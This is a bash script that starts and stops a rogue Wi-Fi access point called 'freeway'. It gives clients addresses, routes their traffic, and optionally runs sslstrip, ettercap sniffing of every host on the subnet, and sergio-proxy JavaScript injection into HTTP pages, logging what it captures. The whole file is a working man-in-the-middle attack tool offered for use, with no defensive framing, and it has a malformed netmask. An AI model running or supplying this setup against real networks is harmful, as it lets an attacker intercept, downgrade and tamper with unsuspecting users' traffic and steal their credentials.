#!/bin/bash
 
############# Configuration constants ###########
 
LOGS_PATH="/root/shell/FakeAp/$(date '+%Y-%m-%d_%H-%M')"
 
OUTPUT_INTERFACE="wlan1"
ROGUE_AP_INTERFACE="wlan0"
ROGUE_AP_CHANNEL=5
ROGUE_AP_SSID="freeway"
DHCPD_CONF_FILE="/etc/dnsmasq.conf"
USE_SSLTRIP="no"
USE_ETTERCAP="yes"
USE_SERGIO="no" # Note: incompatible with USE_SSLSTRIP (also launches its own SSL strip tool)
 
###############################################
 
if [ "$1" == "stop" ];then
	echo "Killing Airbase-ng..."
	pkill airbase-ng
	sleep 3;
	echo "Killing DHCP..."
	pkill dnsmasq
	rm /var/run/dnsmasq.pid
	sleep 3;
	echo "Flushing iptables"
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	if [ "$USE_SSLTRIP" == "yes" ]
	then
		echo "killing sslstrip"
		killall sslstrip 
	fi
	if [ "$USE_ETTERCAP" == "yes" ]
	then
		echo "Kill all ettercap"
		killall -9 ettercap
	fi
 
	if [ "$USE_SERGIO" == "yes" ]
	then
		echo "Kill sergio proxy"
		pkill -9 -f sergio-proxy
	fi
 
	echo "disabling IP Forwarding"
	echo "0" > /proc/sys/net/ipv4/ip_forward
 
	echo "Stop airmon-ng on mon0"
	airmon-ng stop mon0
 
elif [ "$1" == "start" ] 
then
	echo "Tools output stored in ${LOGS_PATH}"
 
	mkdir -p "${LOGS_PATH}"
 
	echo "Putting card in monitor mode"
	airmon-ng start $ROGUE_AP_INTERFACE 
	sleep 5;
	echo "Starting Fake AP..."
	airbase-ng -e "$ROGUE_AP_SSID" -c $ROGUE_AP_CHANNEL wlan0mon &
	sleep 5;
 
	echo "configuring interface at0 according to dhcpd config"
	ifconfig at0 up
	ifconfig at0 192.168.2.129 netmask 255.255.255.218
	echo "adding a route"
	route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129
	sleep 5;
	echo "configuring iptables"
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $OUTPUT_INTERFACE -j MASQUERADE 
	if [ "$USE_SSLTRIP" == "yes" ]
	then
		echo "setting up sslstrip interception"
		iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 15000 
 
		echo "SSLStrip running... "
		sslstrip -w ${LOGS_PATH}/SSLStrip_log.txt -a -l 15000 -f & 
		sleep 2;
	fi
 
	echo "clearing lease table"
	echo > '/var/lib/misc/dnsmasq.leases'
 
	cp ./dnsmasq.conf $DHCPD_CONF_FILE
	echo "starting new DHCPD server"
	#ln -s /run/dhcpd.pid /var/run/dhcpd.pid
 
	dnsmasq -C "$DHCPD_CONF_FILE" -d
	sleep 5;
	if [ "$USE_ETTERCAP" == "yes" ]
	then
		echo "Launching ettercap, spy all hosts on the at0 interface's subnet"
		xterm -bg black -fg blue -e ettercap --silent -T -q -p --log-msg ${LOGS_PATH}/ettercap.log -i at0 // // &
		sleep 8
	fi
 
	if [ "$USE_SERGIO" == "yes" ]
	then
		iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 15000 # Redirection de http vers port 15000
		echo "Starting segio proxy to inject javascript"
		/opt/sergio-proxy/sergio-proxy.py -l 15000 --inject  --html-url "http://192.168.3.1/index" -w ${LOGS_PATH}/SSLStrip_log.txt -a -k  & #  --count-limit 2
	fi
 
	echo "Enable IP Forwarding"
	echo "1" > /proc/sys/net/ipv4/ip_forward
 
else
	echo "usage: ./rogueAP.sh stop|start"
fi
